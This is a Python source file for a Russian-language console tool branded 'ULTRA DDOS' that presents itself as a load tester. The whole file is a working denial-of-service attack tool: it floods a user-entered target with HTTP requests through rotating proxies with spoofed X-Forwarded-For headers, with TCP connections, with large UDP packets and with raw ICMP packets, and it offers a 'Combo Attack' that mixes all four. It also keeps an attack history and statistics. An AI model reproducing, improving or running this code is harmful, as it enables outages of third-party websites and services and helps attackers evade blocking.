import os
import sys
import time
import random
import json
import asyncio
import aiohttp
import socket
import logging
import threading
from datetime import datetime

# ================= CONSOLE SETUP =================
os.system('mode con: cols=120 lines=40')
os.system('color 0F')

# ================= LOGGER =================
log_dir = os.path.dirname(os.path.abspath(__file__))
log_file = os.path.join(log_dir, "ultra.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler(log_file, encoding="utf-8"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ================= COLORS =================
Reset = "\033[0m"
Red = "\033[91m"
Green = "\033[92m"
Yellow = "\033[93m"
Cyan = "\033[96m"
White = "\033[97m"

g = "\033[1;32m"
r = "\033[1;31m"
w = "\033[0m"

G1 = "\033[38;2;0;60;0m"
G2 = "\033[38;2;0;90;0m"
G3 = "\033[38;2;0;120;0m"
G4 = "\033[38;2;0;160;0m"
G5 = "\033[38;2;0;200;0m"
G6 = "\033[38;2;0;230;0m"
G7 = "\033[38;2;50;255;50m"
GW = "\033[38;2;200;255;200m"

# ================= БАННЕР =================
def banner():
    print(f"""
{G1} ██    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄         ▓█████▄ ▓█████▄  ▒█████    ██████ {Reset}
{G2}  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄       ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ {Reset}
{G3}  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄     ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   {Reset}
{G4}  ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒{Reset}
{G5}  ▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒{Reset}
{G6}  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░{Reset}
{G5}  ░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░{Reset}
{G3}   ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  {Reset}
{G2}     ░         ░  ░          ░           ░  ░      ░       ░        ░ ░        ░  {Reset}
{G1}                                               ░       ░                           {Reset}
{G7}
{G7}Version
{G7}v1.1.0.0realise

{G5}Developer:{GW} verifactor @newince
{Reset}
""")

# ================= КОНФИГ =================
CONFIG = {
    "max_threads": 1000,
    "timeout": 3,
    "max_duration": 0,
    "proxy_rotation_interval": 10
}

# ================= СТАТИСТИКА =================
def load_stats():
    try:
        with open('stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"attacks": 0, "requests": 0, "success": 0, "errors": 0}

def save_stats(s):
    try:
        with open('stats.json', 'w') as f:
            json.dump(s, f, indent=4)
    except:
        pass

def save_history(entry):
    try:
        with open('history.json', 'r') as f:
            h = json.load(f)
    except:
        h = []
    h.append(entry)
    if len(h) > 100:
        h = h[-100:]
    try:
        with open('history.json', 'w') as f:
            json.dump(h, f, indent=4)
    except:
        pass

def load_history():
    try:
        with open('history.json', 'r') as f:
            return json.load(f)
    except:
        return []

# ================= PROXY =================
async def check_proxy(p):
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=5)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as s:
            async with s.get('http://httpbin.org/ip', proxy=p) as r:
                return r.status == 200
    except:
        return False

# ================= TCP =================
async def tcp_flood(ip, port):
    try:
        r, w = await asyncio.open_connection(ip, port)
        for _ in range(5):
            w.write(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
            await w.drain()
        w.close()
        await w.wait_closed()
        return True
    except:
        return False

# ================= UDP =================
async def udp_flood(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        packet = os.urandom(65500)
        sock.sendto(packet, (ip, port))
        sock.close()
        return True
    except:
        return False

# ================= ICMP =================
async def icmp_flood(ip):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + os.urandom(56)
        sock.sendto(packet, (ip, 0))
        sock.close()
        return True
    except:
        return False

# ================= SAFE INPUT =================
def safe_int(prompt, default=100, min_val=1, max_val=1000):
    while True:
        u = input(prompt)
        if u == "":
            return default
        try:
            v = int(u)
            if min_val <= v <= max_val:
                return v
        except:
            pass

# ================= ПРОГРЕСС-БАР =================
def draw_progress_bar(percent, width=30):
    percent = max(0, min(100, percent))
    filled = int(width * percent / 100)
    empty = width - filled
    
    if percent < 30:
        color = Green
    elif percent < 70:
        color = Yellow
    else:
        color = Red
    
    bar = color + '█' * filled + Reset + '░' * empty
    return f"[{bar}] {percent}%"

# ================= LOAD TESTER =================
class LoadTester:
    def __init__(self):
        self.running = False
        self.requests = 0
        self.success = 0
        self.errors = 0
        self.banned = 0
        self.bytes_sent = 0
        self.start_time = 0
        self.session = None
        self.proxies = []
        self.idx = 0
        self.lock = asyncio.Lock()

    def load_proxies(self):
        try:
            with open('proxies.txt', 'r') as f:
                self.proxies = [l.strip() for l in f if l.strip()]
            return len(self.proxies)
        except:
            return 0

    def next_proxy(self):
        if not self.proxies:
            return None
        p = self.proxies[self.idx]
        self.idx = (self.idx + 1) % len(self.proxies)
        return p

    async def http_test(self, url):
        try:
            if self.session is None or self.session.closed:
                connector = aiohttp.TCPConnector(limit=500, ttl_dns_cache=60)
                timeout = aiohttp.ClientTimeout(total=CONFIG["timeout"])
                self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)

            proxy = self.next_proxy() if self.proxies else None

            headers = {
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Firefox/121.0',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0',
                ]),
                'Accept': '*/*',
                'Connection': 'keep-alive',
                'Cache-Control': 'no-cache',
                'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }

            if self.banned > 0 and self.banned % CONFIG["proxy_rotation_interval"] == 0:
                self.idx = random.randint(0, len(self.proxies) - 1) if self.proxies else 0
                await asyncio.sleep(0.5)

            async with self.session.get(url, headers=headers, proxy=proxy, ssl=False) as resp:
                body = await resp.read()
                async with self.lock:
                    self.requests += 1
                    self.bytes_sent += len(body)
                    if resp.status in [200, 301, 302, 404]:
                        self.success += 1
                    elif resp.status in [403, 429, 503]:
                        self.banned += 1
                        self.errors += 1
                    else:
                        self.errors += 1
        except:
            async with self.lock:
                self.requests += 1
                self.errors += 1

    async def start_http(self, url, threads):
        self.running = True
        self.requests = self.success = self.errors = self.banned = self.bytes_sent = 0
        self.start_time = time.time()
        self.load_proxies()

        sem = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with sem:
                    await self.http_test(url)
                    await asyncio.sleep(random.uniform(0.0005, 0.005))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    async def start_tcp(self, target, threads):
        try:
            ip = target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            port = 443 if target.startswith('https://') else 80
        except:
            return

        self.running = True
        self.requests = self.success = self.errors = self.banned = 0
        self.start_time = time.time()
        self.load_proxies()

        sem = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with sem:
                    if await tcp_flood(ip, port):
                        async with self.lock:
                            self.requests += 1
                            self.success += 1
                    else:
                        async with self.lock:
                            self.requests += 1
                            self.errors += 1
                    await asyncio.sleep(random.uniform(0.001, 0.01))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    async def start_combo(self, target, threads):
        try:
            ip = target.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            port = 443 if target.startswith('https://') else 80
        except:
            return

        self.running = True
        self.requests = self.success = self.errors = self.banned = 0
        self.start_time = time.time()
        self.load_proxies()

        sem = asyncio.Semaphore(threads)

        async def worker():
            while self.running:
                async with sem:
                    attack_type = random.choice(['http', 'tcp', 'udp', 'icmp'])
                    
                    if attack_type == 'http':
                        await self.http_test(target)
                    elif attack_type == 'tcp':
                        if await tcp_flood(ip, port):
                            async with self.lock:
                                self.requests += 1
                                self.success += 1
                        else:
                            async with self.lock:
                                self.requests += 1
                                self.errors += 1
                    elif attack_type == 'udp':
                        if await udp_flood(ip, port):
                            async with self.lock:
                                self.requests += 1
                                self.success += 1
                        else:
                            async with self.lock:
                                self.requests += 1
                                self.errors += 1
                    elif attack_type == 'icmp':
                        if await icmp_flood(ip):
                            async with self.lock:
                                self.requests += 1
                                self.success += 1
                        else:
                            async with self.lock:
                                self.requests += 1
                                self.errors += 1
                        
                    await asyncio.sleep(random.uniform(0.001, 0.01))

        tasks = [asyncio.create_task(worker()) for _ in range(threads)]

        if CONFIG["max_duration"] > 0:
            await asyncio.sleep(CONFIG["max_duration"])
            self.running = False

        await asyncio.gather(*tasks, return_exceptions=True)

    def stop(self):
        self.running = False
        if self.session:
            asyncio.create_task(self.session.close())

# ================= UI =================
def clear():
    os.system('cls')

class UI:
    def __init__(self):
        self.running = True
        self.menu = 'main'
        self.tester = LoadTester()

    def clear(self):
        os.system('cls')

    def header(self):
        banner()

    def main_menu(self):
        self.clear()
        self.header()
        print(f"""
{G7}ГЛАВНОЕ МЕНЮ

{G7}1.{w} HTTP Load Test
{G6}2.{w} TCP Load Test
{G5}3.{w} DDos site logs
{G4}4.{w} Proxy Management
{G3}5.{w} Total Statistics
{G2}6.{w} History
{G1}7.{w} Settings
{G7}8.{w} INFO — инструкция по использованию
{G6}9.{w} Combo Attack (HTTP+TCP+UDP+ICMP) {Red}🔥 NEW{Reset}
{G7}99.{w} Exit
{Reset}
""")

    def info_menu(self):
        self.clear()
        self.header()
        print(f"""
{G7}ИНСТРУКЦИЯ ПО ИСПОЛЬЗОВАНИЮ

{G7}1.{w} HTTP LOAD TEST — HTTP/HTTPS нагрузка
{G6}2.{w} TCP LOAD TEST — TCP-нагрузка
{G5}3.{w} DDOS SITE LOGS — логи атак
{G4}4.{w} PROXY MANAGEMENT — управление прокси
{G3}5.{w} TOTAL STATISTICS — общая статистика
{G2}6.{w} HISTORY — история атак
{G1}7.{w} SETTINGS — настройки
{G7}8.{w} INFO — эта инструкция
{G6}9.{w} COMBO ATTACK — HTTP+TCP+UDP+ICMP одновременно
{G7}99.{w} EXIT — выход
{Reset}
""")
        input(f"{G7}Нажми ENTER для возврата...{Reset}")

    def settings_menu(self):
        global CONFIG
        self.clear()
        self.header()
        print(f"""
{G7}НАСТРОЙКИ

{G7}1.{w} Max Threads : {CONFIG['max_threads']}
{G6}2.{w} Timeout     : {CONFIG['timeout']}s
{G5}3.{w} Max Duration: {CONFIG['max_duration']}s
{G4}4.{w} Proxy Rot.  : {CONFIG['proxy_rotation_interval']}
{G1}99.{w} Назад
{Reset}
""")
        choice = input(f"{G7}Выбери: {w}")
        if choice == '1':
            v = safe_int(f"{G7}Max Threads (100-2000): {w}", 1000, 100, 2000)
            CONFIG['max_threads'] = v
        elif choice == '2':
            while True:
                v = input(f"{G7}Timeout (0.5-10): {w}")
                try:
                    v = float(v)
                    if 0.5 <= v <= 10:
                        CONFIG['timeout'] = v
                        break
                except:
                    pass
        elif choice == '3':
            v = safe_int(f"{G7}Max Duration (0 = no limit): {w}", 0, 0, 99999)
            CONFIG['max_duration'] = v
        elif choice == '4':
            v = safe_int(f"{G7}Proxy Rotation (5-100): {w}", 10, 5, 100)
            CONFIG['proxy_rotation_interval'] = v
        elif choice == '99':
            return
        self.settings_menu()

    def history_menu(self):
        self.clear()
        self.header()
        h = load_history()
        print(f"{G7}ИСТОРИЯ (последние 10){Reset}")
        if not h:
            print(f"{G3}Нет записей{Reset}")
        else:
            for i, e in enumerate(h[-10:], 1):
                t = e.get('target', 'N/A')[:25]
                r = e.get('requests', 0)
                ts = e.get('timestamp', '')[:16]
                print(f"{G7}{i}.{w} {t}  {G5}{r} req{w}  {G3}{ts}{Reset}")
        input(f"{G7}Нажми ENTER...{Reset}")

    def stats_menu(self):
        self.clear()
        self.header()
        s = load_stats()
        print(f"""
{G7}ОБЩАЯ СТАТИСТИКА

{G7}Атак    : {w}{s['attacks']}
{G6}Запросов: {w}{s['requests']:,}
{G5}Успешно : {Green}{s['success']:,}{Reset}
{G4}Ошибок  : {Red}{s['errors']:,}{Reset}
{Reset}
""")
        input(f"{G7}Нажми ENTER...{Reset}")

    def logs_menu(self):
        self.clear()
        self.header()
        s = load_stats()
        print(f"""
{G7}ЛОГИ СИСТЕМЫ

{G7}Всего атак    : {w}{s['attacks']}
{G6}Всего запросов: {w}{s['requests']:,}
{G5}Всего успешно : {Green}{s['success']:,}{Reset}
{G4}Всего ошибок  : {Red}{s['errors']:,}{Reset}
{Reset}
""")
        input(f"{G7}Нажми ENTER...{Reset}")

    def proxy_menu(self):
        self.clear()
        self.header()
        try:
            with open('proxies.txt', 'r') as f:
                proxies = [l.strip() for l in f if l.strip()]
        except:
            proxies = []
        print(f"""
{G7}УПРАВЛЕНИЕ ПРОКСИ

{G7}1.{w} Добавить прокси вручную
{G6}2.{w} Загрузить из файла
{G5}3.{w} Показать список ({len(proxies)})
{G4}4.{w} Очистить список
{G3}5.{w} Проверить все прокси
{G1}99.{w} Назад
{Reset}
""")
        choice = input(f"{G7}Выбери: {w}")
        if choice == '1':
            p = input(f"{G7}Прокси (http://ip:port): {w}")
            if p:
                with open('proxies.txt', 'a') as f:
                    f.write(p + '\n')
                print(f"{G7}[OK] Добавлен{Reset}")
        elif choice == '2':
            try:
                with open('proxies.txt', 'r') as f:
                    cnt = len([l for l in f if l.strip()])
                print(f"{G7}[OK] Загружено {cnt}{Reset}")
            except:
                print(f"{Red}[!] Файл не найден{Reset}")
        elif choice == '3':
            if proxies:
                print(f"\n{G7}Список:{Reset}")
                for i, p in enumerate(proxies, 1):
                    print(f"{G7}{i}. {w}{p}{Reset}")
            else:
                print(f"{Red}[!] Пусто{Reset}")
            input(f"{G7}Нажми ENTER...{Reset}")
        elif choice == '4':
            open('proxies.txt', 'w').close()
            print(f"{G7}[OK] Очищено{Reset}")
        elif choice == '5':
            print(f"{G7}[!] Проверка...{Reset}")
            async def check():
                valid = []
                for p in proxies:
                    if await check_proxy(p):
                        valid.append(p)
                return valid
            if proxies:
                valid = asyncio.run(check())
                with open('proxies.txt', 'w') as f:
                    f.write('\n'.join(valid))
                print(f"{G7}[OK] Работает: {len(valid)}/{len(proxies)}{Reset}")
            time.sleep(1)
        elif choice == '99':
            return
        self.proxy_menu()

    def attack_progress(self, url, threads, t, attack_type="HTTP"):
        # Очищаем экран перед выводом
        os.system('cls' if os.name == 'nt' else 'clear')
        
        elapsed = int(time.time() - t.start_time)
        rate = int(t.requests / elapsed) if elapsed > 0 else 0
        max_rate = threads * 10
        load = min(100, int((rate / max_rate) * 100)) if max_rate > 0 else 0
        bar = draw_progress_bar(load)
        
        stats = load_stats()
        
        # Выводим баннер
        self.header()
        
        # Выводим прогресс-бар и статистику
        print(f"""
{G7}{attack_type} АТАКА В ПРОЦЕССЕ

{G7}Цель      : {w}{url[:30]}
{G6}Потоки    : {w}{threads}
{G5}Запросы   : {w}{t.requests:,}
{G4}Скорость  : {w}{rate:,} r/s
{G3}Успешно   : {Green}{t.success:,}{Reset}
{G2}Ошибки    : {Red}{t.errors:,}{Reset}
{G1}Бан       : {Red}{t.banned}{Reset}
{G5}Нагрузка  : {w}{bar}
{G6}Время     : {w}{elapsed//3600:02d}:{elapsed%3600//60:02d}:{elapsed%60:02d}
{G7}Данные    : {w}{t.bytes_sent/1024/1024:.1f} MB
{G7}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G6}Всего атак за сессию : {w}{stats['attacks']}
{G6}Всего запросов       : {w}{stats['requests']:,}
{G6}Всего успешно        : {Green}{stats['success']:,}{Reset}
{G6}Всего ошибок         : {Red}{stats['errors']:,}{Reset}
{G7}[Press ENTER to stop]
{Reset}
""")

    def handle(self, choice):
        if self.menu == 'main':
            if choice == '1':
                asyncio.run(self.http_test())
            elif choice == '2':
                asyncio.run(self.tcp_test())
            elif choice == '3':
                self.menu = 'logs'
            elif choice == '4':
                self.menu = 'proxy'
            elif choice == '5':
                self.menu = 'stats'
            elif choice == '6':
                self.menu = 'history'
            elif choice == '7':
                self.menu = 'settings'
            elif choice == '8':
                self.menu = 'info'
            elif choice == '9':
                asyncio.run(self.combo_test())
            elif choice == '99':
                self.running = False
        elif choice.lower() == 'back':
            self.menu = 'main'

    async def http_test(self):
        self.clear()
        self.header()
        print(f"{G7}HTTP НАГРУЗКА — HTTP/HTTPS Flood{Reset}")
        
        url = input(f"{G7}Цель: {w}")
        if not url.startswith('http'):
            url = 'http://' + url
        
        threads = safe_int(f"{G7}Потоки (1-{CONFIG['max_threads']}): {w}", 100, 1, CONFIG['max_threads'])
        
        t = LoadTester()
        task = asyncio.create_task(t.start_http(url, threads))
        
        stop_flag = [False]
        
        def wait_enter():
            input()
            stop_flag[0] = True
        
        enter_thread = threading.Thread(target=wait_enter, daemon=True)
        enter_thread.start()
        
        try:
            while t.running and not stop_flag[0]:
                self.attack_progress(url, threads, t, "HTTP")
                await asyncio.sleep(0.3)
        except KeyboardInterrupt:
            pass
        
        t.stop()
        await task
        
        elapsed = int(time.time() - t.start_time)
        entry = {
            "target": url, "threads": threads, "duration": elapsed,
            "requests": t.requests, "success": t.success, "errors": t.errors,
            "banned": t.banned, "bytes_sent": t.bytes_sent,
            "avg_rate": int(t.requests / elapsed) if elapsed > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
        save_history(entry)
        s = load_stats()
        s["attacks"] += 1
        s["requests"] += t.requests
        s["success"] += t.success
        s["errors"] += t.errors
        save_stats(s)
        
        clear()
        banner()
        print(f"""
{G7}АТАКА ЗАВЕРШЕНА

{G7}Запросы: {w}{t.requests:,}
{G6}Успешно: {Green}{t.success:,}{Reset}
{G5}Ошибки : {Red}{t.errors:,}{Reset}
{G4}Бан    : {Red}{t.banned}{Reset}
{G3}Время  : {w}{elapsed} сек
{G2}Скорость: {w}{int(t.requests/elapsed) if elapsed>0 else 0} r/s
{G7}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G6}Всего атак за сессию: {w}{load_stats()['attacks']}
{Reset}
""")
        input(f"{G7}Нажми ENTER для возврата в меню...{Reset}")

    async def tcp_test(self):
        self.clear()
        self.header()
        print(f"{G7}TCP НАГРУЗКА — TCP Flood{Reset}")
        
        url = input(f"{G7}Цель: {w}")
        if not url.startswith('http'):
            url = 'http://' + url
        
        threads = safe_int(f"{G7}Потоки (1-{CONFIG['max_threads']}): {w}", 100, 1, CONFIG['max_threads'])
        
        t = LoadTester()
        task = asyncio.create_task(t.start_tcp(url, threads))
        
        stop_flag = [False]
        
        def wait_enter():
            input()
            stop_flag[0] = True
        
        enter_thread = threading.Thread(target=wait_enter, daemon=True)
        enter_thread.start()
        
        try:
            while t.running and not stop_flag[0]:
                self.attack_progress(url, threads, t, "TCP")
                await asyncio.sleep(0.3)
        except KeyboardInterrupt:
            pass
        
        t.stop()
        await task
        
        elapsed = int(time.time() - t.start_time)
        entry = {
            "target": url, "threads": threads, "duration": elapsed,
            "requests": t.requests, "success": t.success, "errors": t.errors,
            "banned": t.banned, "bytes_sent": t.bytes_sent,
            "avg_rate": int(t.requests / elapsed) if elapsed > 0 else 0,
            "timestamp": datetime.now().isoformat()
        }
        save_history(entry)
        s = load_stats()
        s["attacks"] += 1
        s["requests"] += t.requests
        s["success"] += t.success
        s["errors"] += t.errors
        save_stats(s)
        
        clear()
        banner()
        print(f"""
{G7}АТАКА ЗАВЕРШЕНА

{G7}Запросы: {w}{t.requests:,}
{G6}Успешно: {Green}{t.success:,}{Reset}
{G5}Ошибки : {Red}{t.errors:,}{Reset}
{G4}Бан    : {Red}{t.banned}{Reset}
{G3}Время  : {w}{elapsed} сек
{G2}Скорость: {w}{int(t.requests/elapsed) if elapsed>0 else 0} r/s
{G7}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G6}Всего атак за сессию: {w}{load_stats()['attacks']}
{Reset}
""")
        input(f"{G7}Нажми ENTER для возврата в меню...{Reset}")

    async def combo_test(self):
        self.clear()
        self.header()
        print(f"{G7}КОМБО-АТАКА — HTTP + TCP + UDP + ICMP{Reset}")
        
        url = input(f"{G7}Цель: {w}")
        if not url.startswith('http'):
            url = 'http://' + url
        
        threads = safe_int(f"{G7}Потоки (1-{CONFIG['max_threads']}): {w}", 100, 1, CONFIG['max_threads'])
        
        t = LoadTester()
        task = asyncio.create_task(t.start_combo(url, threads))
        
        stop_flag = [False]
        
        def wait_enter():
            input()
            stop_flag[0] = True
        
        enter_thread = threading.Thread(target=wait_enter, daemon=True)
        enter_thread.start()
        
        try:
            while t.running and not stop_flag[0]:
                self.attack_progress(url, threads, t, "COMBO")
                await asyncio.sleep(0.3)
        except KeyboardInterrupt:
            pass
        
        t.stop()
        await task
        
        elapsed = int(time.time() - t.start_time)
        entry = {
            "target": url, "threads": threads, "duration": elapsed,
            "requests": t.requests, "success": t.success, "errors": t.errors,
            "banned": t.banned, "bytes_sent": t.bytes_sent,
            "avg_rate": int(t.requests / elapsed) if elapsed > 0 else 0,
            "timestamp": datetime.now().isoformat(),
            "type": "combo"
        }
        save_history(entry)
        s = load_stats()
        s["attacks"] += 1
        s["requests"] += t.requests
        s["success"] += t.success
        s["errors"] += t.errors
        save_stats(s)
        
        clear()
        banner()
        print(f"""
{G7}КОМБО-АТАКА ЗАВЕРШЕНА

{G7}Запросы: {w}{t.requests:,}
{G6}Успешно: {Green}{t.success:,}{Reset}
{G5}Ошибки : {Red}{t.errors:,}{Reset}
{G4}Бан    : {Red}{t.banned}{Reset}
{G3}Время  : {w}{elapsed} сек
{G2}Скорость: {w}{int(t.requests/elapsed) if elapsed>0 else 0} r/s
{G7}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G6}Всего атак за сессию: {w}{load_stats()['attacks']}
{Reset}
""")
        input(f"{G7}Нажми ENTER для возврата в меню...{Reset}")

    def render(self):
        if self.menu == 'main':
            self.main_menu()
        elif self.menu == 'info':
            self.info_menu()
        elif self.menu == 'settings':
            self.settings_menu()
        elif self.menu == 'history':
            self.history_menu()
        elif self.menu == 'stats':
            self.stats_menu()
        elif self.menu == 'logs':
            self.logs_menu()
        elif self.menu == 'proxy':
            self.proxy_menu()

    def run(self):
        try:
            while self.running:
                self.render()
                choice = input(f"\n{G7}┌─ {G5}Input{G7} ─────────────────────────────────┐\n{G7}│{Reset} > {w}").strip()
                print(f"{Reset}\n")
                self.handle(choice)
        except KeyboardInterrupt:
            self.clear()
            print(f"""
{G7}
╔═══════════════════════════════════════════════════════════╗
║        TERMINATING NEURAL LINK...                        ║
║        System Standby Mode Activated                     ║
║        Good Luck, Hacker.                                ║
╚═══════════════════════════════════════════════════════════╝
{G7}[ErrorCode404] Session Ended - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Reset}
""")

if __name__ == '__main__':
    ui = UI()
    ui.run()
